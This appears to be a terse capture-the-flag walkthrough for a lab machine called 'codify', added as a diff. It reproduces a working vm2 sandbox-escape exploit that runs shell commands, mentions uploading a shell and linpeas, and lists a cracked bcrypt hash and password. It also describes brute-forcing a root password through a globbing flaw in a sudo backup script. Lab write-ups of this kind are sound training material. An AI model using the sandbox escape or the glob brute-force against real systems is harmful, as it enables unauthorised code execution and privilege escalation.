@@ -1,0 +1,53 @@
+codify
+
+  about on the page reveals the editor uses the vm2 library
+
+  checking library's github reveals it has been deprecated due to security holes
+
+  looking it up on google reveals an exploit https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
+
+  ```
+  async function fn() {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+  }
+  p = fn();
+  p.constructor = {
+      [Symbol.species]: class FakePromise {
+          constructor(executor) {
+              executor(
+                  (x) => x,
+                  (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
+              )
+          }
+      }
+  };
+  p.then();
+
+  ```
+
+  uploading a shell and linpeas reveals tickets.db
+
+  ls /home reveals user joshua
+
+  tickets.db gives this:
+    3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+
+  hashid reveals this is bcrypt
+
+  running john with rockyou decrypts this as spongebob1
+
+  ssh into joshua spongebob1 gives user.txt
+
+  sudo -l as joshua finds this script
+    /opt/scripts/mysql-backup.sh
+
+  shellcheck on this script reveals a globbing vulnerability where first n correct chars + * make it execute
+
+  a python script that recursively iterates over the alphanumeric chars guesses the password to be kljh12k3jhaskjh12kjh3
+
+  root kljh12k3jhaskjh12kjh3 gives /root/root.txt
+  
+  gg
